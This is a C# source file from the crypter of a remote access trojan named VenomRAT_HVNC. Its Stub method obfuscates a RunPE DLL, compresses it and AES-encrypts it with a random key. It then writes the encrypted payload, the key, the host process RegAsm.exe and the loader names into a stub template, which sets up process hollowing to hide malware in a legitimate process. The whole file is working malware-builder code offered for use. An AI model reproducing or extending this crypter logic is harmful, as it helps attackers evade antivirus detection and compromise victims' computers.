using System.IO;
using System.Runtime.InteropServices;
using Client.Obfuscation;
using VenomRAT_HVNC.Crypter.Algorithms;

namespace VenomRAT_HVNC.Crypter.Settings;

public class Replace
{
    public static string Stub(string stub)
    {
        byte[] runpeBytes = File.ReadAllBytes(Settings.FileNameRunPeDllMain);
        Obfuscate.ObfRunPe(Settings.FileNameRunPeDllMain,Settings.FileNameRunPeDllTemps);
        string pathProcess = "RegAsm.exe";
        string keyRunpe = new GenerateKey(256).GenerateStrenghCharacter();
        string aesCompressRunPeBase64 = Aes.AesEncryptBytes(Aes.Compress(File.ReadAllBytes(Settings.FileNameRunPeDllTemps)), keyRunpe);
        

        //RunPE.Class1.Execute
        stub = stub.Replace("#CodeRunPE#", aesCompressRunPeBase64);
        stub = stub.Replace("#PasswordRunPE#", keyRunpe);
        stub = stub.Replace("#PathProcess#", pathProcess);
        stub = stub.Replace("#NamespaceRunpe#", Settings.NamespaceRunPe);
        stub = stub.Replace("#ClassRunpe#", Settings.ClassRunPe);
        stub = stub.Replace("#MethodsRunPE#", Settings.MethodRunPe);
        
        return stub;
    }
}